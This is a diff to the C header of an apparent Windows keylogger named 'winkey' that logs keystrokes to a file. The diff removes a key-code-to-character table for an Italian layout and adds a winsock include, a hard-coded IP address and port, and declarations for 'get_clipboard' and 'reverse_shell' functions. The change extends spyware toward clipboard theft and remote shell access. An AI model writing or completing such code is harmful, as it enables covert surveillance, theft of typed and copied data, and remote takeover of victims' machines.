@@ -4,6 +4,11 @@
 // https://learn.microsoft.com/it-it/cpp/error-messages/compiler-warnings/c5045?view=msvc-170
 # pragma warning(disable : 5045)
 
+# pragma warning(disable : 4113)
+# pragma warning(disable : 4133)
+# pragma warning(disable : 4820)
+# pragma warning(disable : 4996)
+
 // https://social.msdn.microsoft.com/Forums/en-US/01354cd0-f0bc-40b3-a024-4e96643fc8b8/uwpc14393-warning-c4668-win32winntwin10th2-is-not-defined-as-a-preprocessor-macro?forum=wpdevelop
 # define WIN32_LEAN_AND_MEAN
 
@@ -11,65 +16,14 @@
 # include <signal.h>
 # include <windows.h>
 # include <winuser.h>
+# include <winsock2.h>
 
 # define LOGNAME "winkey.log"
 
-char	keys[2][256][20] = {
-{
-	"", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
-	"", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
-	"{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
-	"", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
-	"{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "0", "1",
-	"2", "3", "4", "5", "6", "7", "8", "9", "", "",
-	"", "", "", "", "", "a", "b", "c", "d", "e",
-	"f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
-	"p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
-	"z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
-	"4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
-	".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
-	"F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
-	"F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
-	"", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
-	"" , "" , "" , "" , "" , "" , "" , "" , "" , "",
-	"", "", "", "", "", "", "è", "+", ",", "-",
-	".", "ù", "ò", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "'",
-	"\\", "ì", "à", "", "", "", "<", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", ""
-}, {
-	"", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
-	"", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
-	"{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
-	"", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
-	"{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "=", "!",
-	"\"", "£", "$", "%", "&", "/", "(", ")", "", "",
-	"", "", "", "", "", "A", "B", "C", "D", "E",
-	"F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
-	"P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y",
-	"Z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
-	"4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
-	".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
-	"F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
-	"F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
-	"", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
-	"" , "" , "" , "" , "" , "" , "" , "" , "" , "",
-	"", "", "", "", "", "", "é", "*", ";", "_",
-	":", "§", "ç", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "?",
-	"|", "^", "°", "", "", "", ">", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", "", "", "", "", "",
-	"", "", "", "", "", ""
-}
-};
+# define IPADDR "127.0.0.1"
+# define PORT 8888
+
+void			get_clipboard(void);
+void CALLBACK	reverse_shell(void);
 
 #endif
